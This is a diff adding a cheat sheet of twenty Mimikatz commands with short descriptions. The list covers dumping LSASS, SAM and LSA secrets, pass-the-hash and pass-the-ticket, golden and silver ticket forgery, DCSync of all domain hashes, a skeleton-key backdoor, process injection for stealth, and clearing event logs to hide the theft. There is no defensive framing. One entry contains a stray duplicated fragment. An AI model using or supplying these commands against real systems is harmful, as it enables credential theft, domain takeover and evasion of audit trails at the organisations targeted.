@@ -1,0 +1,74 @@
+MIMIKATZ
+
+1 - Elevate Privileges - This command attempts to elevate privileges to SYSTEM level, required for many credential extraction operations.
+privilege::debug
+
+2 - Extract All Credentials - This command extracts all available credentials from LSASS memory including plaintext passwords, hashes, and Kerberos tickets.
+sekurlsa::logonpasswords
+
+3 - Dump LSASS Process - This command creates a dump of the LSASS process for offline analysis, useful when direct execution is restricted.
+sekurlsa::minidump lsass.dmp
+
+4 - Extract Kerberos Tickets
+sekurlsa::tickets
+
+5 - Export Kerberos Tickets
+sekurlsa::tickets /export
+
+6 - Pass-the-Hash - This command performs pass-the-hash by creating a new process with specified NTLM hash, enabling authentication without plaintext passwords.
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe
+
+7 - Pass-the-Ticket - This command injects a Kerberos ticket into the current session, enabling access to resources using stolen tickets.
+kerberos::ptt <ticket_file>
+
+8 - Create Golden Ticket - This command creates a golden ticket using the krbtgt hash, providing persistent domain admin access.
+kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500
+
+9 - Create Silver Ticket - This command creates a silver ticket for accessing specific services without contacting the domain controller.
+kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<service_hash>
+
+10 - DCSync Attack - This command performs DCSync to extract password hashes from Active Directory by impersonating a domain controller.
+lsadump::dcsync /user:<domain>\<username>
+
+11 - DCSync All Users - This command extracts password hashes for all domain users using DCSync, providing complete credential access.
+lsadump::dcsync /domain:<domain> /all /csv
+
+12 - Dump SAM Database - This command dumps the local SAM database containing local user account hashes.
+lsadump::sam
+
+13 - Dump LSA Secrets - This command extracts LSA secrets including service account credentials and cached domain credentials.
+lsadump::secrets
+
+14 - Skeleton Key Attack - This command injects a skeleton key into domain controller memory, creating a backdoor password for all accounts.mimikatz # misc::skeleton
+misc::skeleton
+
+15 - Extract Credential Manager - This command extracts credentials stored in Windows Credential Manager, revealing saved passwords.
+vault::list
+
+16 - DPAPI Decryption - This command decrypts DPAPI-protected data including saved passwords and certificates.
+dpapi::cred /in:<credential_file>
+
+17 - Token Elevation - This command manipulates Windows access tokens to impersonate other users or elevate privileges.
+token::elevate
+
+18 - Inject into Process - This command injects Mimikatz into a remote process for stealth and privilege escalation.
+process::inject /pid:<pid>
+
+19 - Clear Event Logs - This command clears Windows event logs to remove traces of Mimikatz execution and credential theft.
+event::clear
+
+20 - Dump Kerberos Keys - This command extracts Kerberos encryption keys from memory for offline cracking or ticket creation.
+sekurlsa::ekeys
+
+
+
+
+
+
+
+
+
+
+
+
+
